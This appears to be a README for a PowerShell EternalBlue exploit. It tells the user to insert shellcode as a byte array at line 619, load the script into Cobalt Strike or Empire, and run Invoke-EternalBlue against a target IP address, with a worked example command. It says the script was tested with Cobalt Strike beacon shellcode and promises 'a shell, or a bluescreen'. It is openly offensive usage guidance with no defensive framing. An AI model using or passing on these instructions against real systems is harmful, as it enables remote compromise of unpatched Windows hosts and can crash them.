Eternal blue powershell exploit

Add your shellcode to line 619 in the following format:  `[Byte[]]  $payload = [Byte[]](0xB9,0xC3,0x00)`


import into cobalt or empire

then run `invoke-eternableblue -target <target_ip> -max_attempts <num> -initial_grooms <num>`

Example: `Invoke-EternalBlue -target 10.0.100.106 -max_attempts 3 -initial_grooms 12`

Tested with Cobalt strike generated beacon shellcode. 

enjoy a shell, or a bluescreen
